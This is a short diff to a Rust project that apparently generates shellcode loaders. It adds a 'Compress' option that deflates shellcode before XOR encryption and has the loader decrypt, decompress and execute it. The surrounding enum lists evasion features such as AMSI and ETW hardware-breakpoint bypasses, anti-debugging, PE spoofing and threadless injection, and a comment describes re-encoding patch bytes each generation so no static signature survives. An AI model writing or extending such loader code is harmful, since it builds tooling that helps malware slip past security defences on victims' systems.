@@ -96,6 +96,10 @@ pub enum Feature {
     AmsiHwbp, EtwHwbp,
     PeCloak, AntiDebug,
     PeSpoofing, Staged, AppDomain, ThreadlessInject,
+    /// Raw-deflate compress shellcode before XOR-encryption. Loader applies
+    /// the inverse: XOR-decrypt → deflate-decompress → execute. Free in .NET
+    /// (System.IO.Compression in BCL); useful for repetitive payloads.
+    Compress,
 }
 
 #[derive(Debug, Clone, Serialize, PartialEq)]
@@ -532,6 +536,12 @@ fn build_context(config: &LoaderConfig) -> Context {
         .map(|f| format!("{:?}", f))
         .collect();
     ctx.insert("feature_names", &feature_names);
+
+    // `is_compressed` is a shortcut for templates so they don't need to
+    // grep `feature_names`. Backend toggles it by pre-compressing the
+    // shellcode_hex bytes before XOR encryption.
+    let is_compressed = config.features.iter().any(|f| matches!(f, Feature::Compress));
+    ctx.insert("is_compressed", &is_compressed);
 
     // XOR-encode AMSI/ETW patch bytes per-generation so no static byte signature survives
     let amsi_xor: u8 = rng.gen();
